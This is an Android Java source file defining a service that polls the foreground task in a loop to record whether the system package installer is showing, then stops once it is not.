package com.xstd.qm;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-29
 * Time: PM5:52
 * To change this template use File | Settings | File Templates.
 */
public class WatchingService extends Service {

    private Thread mWatchingThread;

    @Override
    public void onCreate() {
        super.onCreate();

        AppRuntime.WATCHING_SERVICE_RUNNING.set(true);

        final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        mWatchingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
                    if (!"com.android.packageinstaller".equals(packname)) {
                        AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(false);
                        break;
                    } else {
                        AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(true);
                    }
                }

                stopSelf();
            }
        });

        mWatchingThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        AppRuntime.WATCHING_SERVICE_RUNNING.set(false);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
